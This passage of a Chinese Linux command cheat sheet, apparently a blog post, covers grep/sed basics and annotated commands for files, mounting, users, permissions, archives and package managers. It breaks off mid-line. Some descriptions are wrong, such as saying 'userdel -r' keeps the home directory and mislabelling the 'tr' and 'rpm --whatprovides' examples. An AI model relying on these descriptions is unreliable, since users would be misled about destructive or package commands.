id="1-三个与正则表达式的相关处理命令"><a href="#1-三个与正则表达式的相关处理命令" class="headerlink" title="1.三个与正则表达式的相关处理命令"></a>1.三个与正则表达式的相关处理命令</h4><ul><li>grep&#x2F;egrep&#x2F;fgrep:在文件中查找字符串</li><li>sed：流编辑</li><li>awk:逐行扫描进行文本处理的一门语言</li></ul><p><strong>grep：</strong></p><ul><li>语法：grep  模式  文件名列表</li><li>fgrep快速搜索指定字符串，不是按模式而是按字符串</li><li>egrep使用扩展正则表达式描述模式</li><li>-F –fixed-strings     -G –basic-regular expression   -E –extended-regexp    -P –perl-regexp(PCRE)</li><li>查PCRE语法：man pcresyntax</li><li>-n 显示每行的行号    -v显示不包含模式的行   -i 字母比较时忽略字母的大小写</li></ul><p><strong>sed：</strong></p><ul><li>用法：sed  ‘命令’ 文件名列表</li><li>Linux sed 命令是利用脚本来处理文本文件。sed 可依照脚本的指令来处理、编辑文本文件。Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等</li></ul><h2 id="linux命令大全"><a href="#linux命令大全" class="headerlink" title="linux命令大全"></a>linux命令大全</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">arch</span> 显示机器的处理器架构<br><span class="hljs-built_in">uname</span> -m 显示机器的处理器架构<br><span class="hljs-built_in">uname</span> -r 显示正在使用的内核版本 <br>dmidecode -q 显示硬件系统部件 - (SMBIOS / DMI) <br>hdparm -i /dev/hda 罗列一个磁盘的架构特性 <br>hdparm -tT /dev/sda 在磁盘上执行测试性读取操作 <br><span class="hljs-built_in">cat</span> /proc/cpuinfo 显示CPU info的信息 <br><span class="hljs-built_in">cat</span> /proc/interrupts 显示中断 <br><span class="hljs-built_in">cat</span> /proc/meminfo 校验内存使用 <br><span class="hljs-built_in">cat</span> /proc/swaps 显示哪些swap被使用 <br><span class="hljs-built_in">cat</span> /proc/version 显示内核的版本 <br><span class="hljs-built_in">cat</span> /proc/net/dev 显示网络适配器及统计 <br><span class="hljs-built_in">cat</span> /proc/mounts 显示已加载的文件系统 <br>lspci -tv 罗列 PCI 设备 <br>lsusb -tv 显示 USB 设备 <br><span class="hljs-built_in">date</span> 显示系统日期 <br>cal 2007 显示2007年的日历表 <br><span class="hljs-built_in">date</span> 041217002007.00 设置日期和时间 - 月日时分年.秒 <br>clock -w 将时间修改保存到 BIOS <br><br><br></code></pre></td></tr></table></figure><h3 id="关机-系统的关机、重启以及登出"><a href="#关机-系统的关机、重启以及登出" class="headerlink" title="关机 (系统的关机、重启以及登出 )"></a>关机 (系统的关机、重启以及登出 )</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">shutdown -h now 关闭系统<br>init 0 关闭系统<br>telinit 0 关闭系统<br>shutdown -h hours:minutes &amp; 按预定时间关闭系统 <br>shutdown -c 取消按预定时间关闭系统 <br>shutdown -r now 重启<br>reboot 重启<br><span class="hljs-built_in">logout</span> 注销 <br><br><br></code></pre></td></tr></table></figure><h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home 进入 <span class="hljs-string">&#x27;/ home&#x27;</span> 目录<span class="hljs-string">&#x27; </span><br><span class="hljs-string">cd .. 返回上一级目录 </span><br><span class="hljs-string">cd ../.. 返回上两级目录 </span><br><span class="hljs-string">cd 进入个人的主目录 </span><br><span class="hljs-string">cd ~user1 进入个人的主目录 </span><br><span class="hljs-string">cd - 返回上次所在的目录 </span><br><span class="hljs-string">pwd 显示工作路径 </span><br><span class="hljs-string">ls 查看目录中的文件 </span><br><span class="hljs-string">ls -F 查看目录中的文件 </span><br><span class="hljs-string">ls -l 显示文件和目录的详细资料 </span><br><span class="hljs-string">ls -a 显示隐藏文件 </span><br><span class="hljs-string">ls *[0-9]* 显示包含数字的文件名和目录名 </span><br><span class="hljs-string">tree 显示文件和目录由根目录开始的树形结构</span><br><span class="hljs-string">lstree 显示文件和目录由根目录开始的树形结构</span><br><span class="hljs-string">mkdir dir1 创建一个叫做 &#x27;</span>dir1<span class="hljs-string">&#x27; 的目录&#x27;</span> <br><span class="hljs-built_in">mkdir</span> dir1 dir2 同时创建两个目录 <br><span class="hljs-built_in">mkdir</span> -p /tmp/dir1/dir2 创建一个目录树 <br><span class="hljs-built_in">rm</span> -f file1 删除一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span> 的文件<span class="hljs-string">&#x27; </span><br><span class="hljs-string">rmdir dir1 删除一个叫做 &#x27;</span>dir1<span class="hljs-string">&#x27; 的目录&#x27;</span> <br><span class="hljs-built_in">rm</span> -rf dir1 删除一个叫做 <span class="hljs-string">&#x27;dir1&#x27;</span> 的目录并同时删除其内容 <br><span class="hljs-built_in">rm</span> -rf dir1 dir2 同时删除两个目录及它们的内容 <br><span class="hljs-built_in">mv</span> dir1 new_dir 重命名/移动 一个目录 <br><span class="hljs-built_in">cp</span> file1 file2 复制一个文件 <br><span class="hljs-built_in">cp</span> <span class="hljs-built_in">dir</span>/* . 复制一个目录下的所有文件到当前工作目录 <br><span class="hljs-built_in">cp</span> -a /tmp/dir1 . 复制一个目录到当前工作目录 <br><span class="hljs-built_in">cp</span> -a dir1 dir2 复制一个目录 <br><span class="hljs-built_in">cp</span> -r dir1 dir2 复制一个目录及子目录<br><span class="hljs-built_in">ln</span> -s file1 lnk1 创建一个指向文件或目录的软链接 <br><span class="hljs-built_in">ln</span> file1 lnk1 创建一个指向文件或目录的物理链接 <br><span class="hljs-built_in">touch</span> -t 0712250000 file1 修改一个文件或目录的时间戳 - (YYMMDDhhmm) <br>file file1 outputs the mime <span class="hljs-built_in">type</span> of the file as text <br>iconv -l 列出已知的编码 <br><br></code></pre></td></tr></table></figure><h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name file1 从 <span class="hljs-string">&#x27;/&#x27;</span> 开始进入根文件系统搜索文件和目录 <br>find / -user user1 搜索属于用户 <span class="hljs-string">&#x27;user1&#x27;</span> 的文件和目录 <br>find /home/user1 -name \*.bin 在目录 <span class="hljs-string">&#x27;/ home/user1&#x27;</span> 中搜索带有<span class="hljs-string">&#x27;.bin&#x27;</span> 结尾的文件 <br>find /usr/bin -<span class="hljs-built_in">type</span> f -atime +100 搜索在过去100天内未被使用过的执行文件 <br>find /usr/bin -<span class="hljs-built_in">type</span> f -mtime -10 搜索在10天内被创建或者修改过的文件 <br>find / -name \*.rpm -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> 755 <span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> \; 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件并定义其权限 <br>find / -xdev -name \*.rpm 搜索以 <span class="hljs-string">&#x27;.rpm&#x27;</span> 结尾的文件，忽略光驱、捷盘等可移动设备 <br>locate \*.ps 寻找以 <span class="hljs-string">&#x27;.ps&#x27;</span> 结尾的文件 - 先运行 <span class="hljs-string">&#x27;updatedb&#x27;</span> 命令 <br>whereis halt 显示一个二进制文件、源码或man的位置 <br><span class="hljs-built_in">which</span> halt 显示一个二进制文件或可执行文件的完整路径 <br><br><br></code></pre></td></tr></table></figure><h3 id="挂载一个文件系统"><a href="#挂载一个文件系统" class="headerlink" title="挂载一个文件系统"></a>挂载一个文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount /dev/hda2 /mnt/hda2 挂载一个叫做hda2的盘 - 确定目录 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 已经存在 <br>umount /dev/hda2 卸载一个叫做hda2的盘 - 先从挂载点 <span class="hljs-string">&#x27;/ mnt/hda2&#x27;</span> 退出 <br>fuser -km /mnt/hda2 当设备繁忙时强制卸载 <br>umount -n /mnt/hda2 运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用 <br>mount /dev/fd0 /mnt/floppy 挂载一个软盘 <br>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom <br>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom <br>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom <br>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件 <br>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 <br>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备 <br>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 <br></code></pre></td></tr></table></figure><h3 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span> -h 显示已经挂载的分区列表 <br><span class="hljs-built_in">ls</span> -lSr |more 以尺寸大小排列文件和目录 <br><span class="hljs-built_in">du</span> -sh dir1 估算目录 <span class="hljs-string">&#x27;dir1&#x27;</span> 已经使用的磁盘空间<span class="hljs-string">&#x27; </span><br><span class="hljs-string">du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </span><br><span class="hljs-string">rpm -q -a --qf &#x27;</span>%10&#123;SIZE&#125;t%&#123;NAME&#125;n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </span><br><span class="hljs-string">dpkg-query -W -f=&#x27;</span><span class="hljs-variable">$&#123;Installed-Size;10&#125;</span>t<span class="hljs-variable">$&#123;Package&#125;</span>n<span class="hljs-string">&#x27; | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </span><br></code></pre></td></tr></table></figure><h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd group_name 创建一个新用户组 <br>groupdel group_name 删除一个用户组 <br>groupmod -n new_group_name old_group_name 重命名一个用户组 <br>useradd -c <span class="hljs-string">&quot;Name Surname &quot;</span> -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 <span class="hljs-string">&quot;admin&quot;</span> 用户组的用户 <br>useradd user1 创建一个新用户 <br>userdel -r user1 删除一个用户 ( <span class="hljs-string">&#x27;-r&#x27;</span> 排除主目录) <br>usermod -c <span class="hljs-string">&quot;User FTP&quot;</span> -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性 <br>passwd 修改口令 <br>passwd user1 修改一个用户的口令 (只允许root执行) <br>chage -E 2005-12-31 user1 设置用户口令的失效期限 <br>pwck 检查 <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的用户 <br>grpck 检查 <span class="hljs-string">&#x27;/etc/passwd&#x27;</span> 的文件格式和语法修正以及存在的群组 <br>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 <br></code></pre></td></tr></table></figure><h3 id="文件的权限-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh 显示权限 <br><span class="hljs-built_in">ls</span> /tmp | <span class="hljs-built_in">pr</span> -T5 -W<span class="hljs-variable">$COLUMNS</span> 将终端划分成5栏显示 <br><span class="hljs-built_in">chmod</span> ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 <br><span class="hljs-built_in">chmod</span> go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限 <br><span class="hljs-built_in">chown</span> user1 file1 改变一个文件的所有人属性 <br><span class="hljs-built_in">chown</span> -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 <br><span class="hljs-built_in">chgrp</span> group1 file1 改变文件的群组 <br><span class="hljs-built_in">chown</span> user1:group1 file1 改变一个文件的所有人和群组属性 <br>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 <br><span class="hljs-built_in">chmod</span> u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限 <br><span class="hljs-built_in">chmod</span> u-s /bin/file1 禁用一个二进制文件的 SUID位 <br><span class="hljs-built_in">chmod</span> g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的 <br><span class="hljs-built_in">chmod</span> g-s /home/public 禁用一个目录的 SGID 位 <br><span class="hljs-built_in">chmod</span> o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件 <br><span class="hljs-built_in">chmod</span> o-t /home/public 禁用一个目录的 STIKY 位 <br></code></pre></td></tr></table></figure><h3 id="文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消"><a href="#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消" class="headerlink" title="文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消"></a>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +a file1 只允许以追加方式读写文件 <br>chattr +c file1 允许这个文件能被内核自动压缩/解压 <br>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 <br>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 <br>chattr +s file1 允许一个文件被安全地删除 <br>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 <br>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 <br>lsattr 显示特殊的属性 <br></code></pre></td></tr></table></figure><h3 id="打包和压缩文件"><a href="#打包和压缩文件" class="headerlink" title="打包和压缩文件"></a>打包和压缩文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">bunzip2 file1.bz2 解压一个叫做 <span class="hljs-string">&#x27;file1.bz2&#x27;</span>的文件 <br>bzip2 file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span> 的文件 <br>gunzip file1.gz 解压一个叫做 <span class="hljs-string">&#x27;file1.gz&#x27;</span>的文件 <br>gzip file1 压缩一个叫做 <span class="hljs-string">&#x27;file1&#x27;</span>的文件 <br>gzip -9 file1 最大程度压缩 <br>rar a file1.rar test_file 创建一个叫做 <span class="hljs-string">&#x27;file1.rar&#x27;</span> 的包 <br>rar a file1.rar file1 file2 dir1 同时压缩 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及目录 <span class="hljs-string">&#x27;dir1&#x27;</span> <br>rar x file1.rar 解压rar包 <br>unrar x file1.rar 解压rar包 <br>tar -cvf archive.tar file1 创建一个非压缩的 tarball <br>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 <span class="hljs-string">&#x27;file1&#x27;</span>, <span class="hljs-string">&#x27;file2&#x27;</span> 以及 <span class="hljs-string">&#x27;dir1&#x27;</span>的档案文件 <br>tar -tf archive.tar 显示一个包中的内容 <br>tar -xvf archive.tar 释放一个包 <br>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下 <br>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包 <br>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包 <br>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包 <br>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包 <br>zip file1.zip file1 创建一个zip格式的压缩包 <br>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 <br>unzip file1.zip 解压一个zip格式压缩包 <br></code></pre></td></tr></table></figure><h3 id="RPM-包-（Fedora-Redhat及类似系统）"><a href="#RPM-包-（Fedora-Redhat及类似系统）" class="headerlink" title="RPM 包 - （Fedora, Redhat及类似系统）"></a>RPM 包 - （Fedora, Redhat及类似系统）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm -ivh package.rpm 安装一个rpm包 <br>rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 <br>rpm -U package.rpm 更新一个rpm包但不改变其配置文件 <br>rpm -F package.rpm 更新一个确定已经安装的rpm包 <br>rpm -e package_name.rpm 删除一个rpm包 <br>rpm -qa 显示系统中所有已经安装的rpm包 <br>rpm -qa | grep httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的rpm包 <br>rpm -qi package_name 获取一个已安装包的特殊信息 <br>rpm -qg <span class="hljs-string">&quot;System Environment/Daemons&quot;</span> 显示一个组件的rpm包 <br>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 <br>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 <br>rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表 <br>rpm -q package_name --whatprovides 显示一个rpm包所占的体积 <br>rpm -q package_name --scripts 显示在安装/删除期间所执行的脚本l <br>rpm -q package_name --changelog 显示一个rpm包的修改历史 <br>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 <br>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 <br>rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 <br>rpm --checksig package.rpm 确认一个rpm包的完整性 <br>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 <br>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 <br>rpm -Va 检查系统中所有已安装的rpm包- 小心使用 <br>rpm -Vp package.rpm 确认一个rpm包还未安装 <br>rpm2cpio package.rpm | cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件 <br>rpm -ivh /usr/src/redhat/RPMS/`<span class="hljs-built_in">arch</span>`/package.rpm 从一个rpm源码安装一个构建好的包 <br>rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 <br></code></pre></td></tr></table></figure><h3 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）"><a href="#YUM-软件包升级器-（Fedora-RedHat及类似系统）" class="headerlink" title="YUM 软件包升级器 - （Fedora, RedHat及类似系统）"></a>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install package_name 下载并安装一个rpm包 <br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 <br>yum update package_name.rpm 更新当前系统中所有安装的rpm包 <br>yum update package_name 更新一个rpm包 <br>yum remove package_name 删除一个rpm包 <br>yum list 列出当前系统中安装的所有包 <br>yum search package_name 在rpm仓库中搜寻软件包 <br>yum clean packages 清理rpm缓存删除下载的包 <br>yum clean headers 删除所有头文件 <br>yum clean all 删除所有缓存的包和头文件 <br></code></pre></td></tr></table></figure><h3 id="DEB-包-Debian-Ubuntu-以及类似系统"><a href="#DEB-包-Debian-Ubuntu-以及类似系统" class="headerlink" title="DEB 包 (Debian, Ubuntu 以及类似系统)"></a>DEB 包 (Debian, Ubuntu 以及类似系统)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -i package.deb 安装/更新一个 deb 包 <br>dpkg -r package_name 从系统删除一个 deb 包 <br>dpkg -l 显示系统中所有已经安装的 deb 包 <br>dpkg -l | grep httpd 显示所有名称中包含 <span class="hljs-string">&quot;httpd&quot;</span> 字样的deb包 <br>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 <br>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 <br>dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表 <br>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 <br></code></pre></td></tr></table></figure><h3 id="APT-软件工具-Debian-Ubuntu-以及类似系统"><a href="#APT-软件工具-Debian-Ubuntu-以及类似系统" class="headerlink" title="APT 软件工具 (Debian, Ubuntu 以及类似系统)"></a>APT 软件工具 (Debian, Ubuntu 以及类似系统)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install package_name 安装/更新一个 deb 包 <br>apt-cdrom install package_name 从光盘安装/更新一个 deb 包 <br>apt-get update 升级列表中的软件包 <br>apt-get upgrade 升级所有已安装的软件 <br>apt-get remove package_name 从系统删除一个deb包 <br>apt-get check 确认依赖的软件仓库正确 <br>apt-get clean 从下载的软件包中清理缓存 <br>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 <br></code></pre></td></tr></table></figure><h3 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 从第一个字节开始正向查看文件的内容 <br><span class="hljs-built_in">tac</span> file1 从最后一行开始反向查看一个文件的内容 <br>more file1 查看一个长文件的内容 <br>less file1 类似于 <span class="hljs-string">&#x27;more&#x27;</span> 命令，但是它允许在文件中和正向操作一样的反向操作 <br><span class="hljs-built_in">head</span> -2 file1 查看一个文件的前两行 <br><span class="hljs-built_in">tail</span> -2 file1 查看一个文件的最后两行 <br><span class="hljs-built_in">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容 <br><br><br></code></pre></td></tr></table></figure><h3 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> file1 file2 ... | <span class="hljs-built_in">command</span> &lt;&gt; file1_in.txt_or_file1_out.txt general syntax <span class="hljs-keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <br><span class="hljs-built_in">cat</span> file1 | <span class="hljs-built_in">command</span>( sed, grep, awk, grep, etc...) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 <br><span class="hljs-built_in">cat</span> file1 | <span class="hljs-built_in">command</span>( sed, grep, awk, grep, etc...) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 <br>grep Aug /var/log/messages 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找关键词<span class="hljs-string">&quot;Aug&quot;</span> <br>grep ^Aug /var/log/messages 在文件 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span>中查找以<span class="hljs-string">&quot;Aug&quot;</span>开始的词汇 <br>grep [0-9] /var/log/messages 选择 <span class="hljs-string">&#x27;/var/log/messages&#x27;</span> 文件中所有包含数字的行 <br>grep Aug -R /var/log/* 在目录 <span class="hljs-string">&#x27;/var/log&#x27;</span> 及随后的目录中搜索字符串<span class="hljs-string">&quot;Aug&quot;</span> <br>sed <span class="hljs-string">&#x27;s/stringa1/stringa2/g&#x27;</span> example.txt 将example.txt文件中的 <span class="hljs-string">&quot;string1&quot;</span> 替换成 <span class="hljs-string">&quot;string2&quot;</span> <br>sed <span class="hljs-string">&#x27;/^$/d&#x27;</span> example.txt 从example.txt文件中删除所有空白行 <br>sed <span class="hljs-string">&#x27;/ *#/d; /^$/d&#x27;</span> example.txt 从example.txt文件中删除所有注释和空白行 <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;esempio&#x27;</span> | <span class="hljs-built_in">tr</span> <span class="hljs-string">&#x27;[:lower:]&#x27;</span> <span class="hljs-string">&#x27;[:upper:]&#x27;</span> 合并上下单元格内容 <br>sed -e <span class="hljs-string">&#x27;1d&#x27;</span> result.txt 从文件example.txt 中排除第一行 <br>sed -n <span class="hljs-string">&#x27;/stringa1/p&#x27;</span> 查看只包含词汇 <span 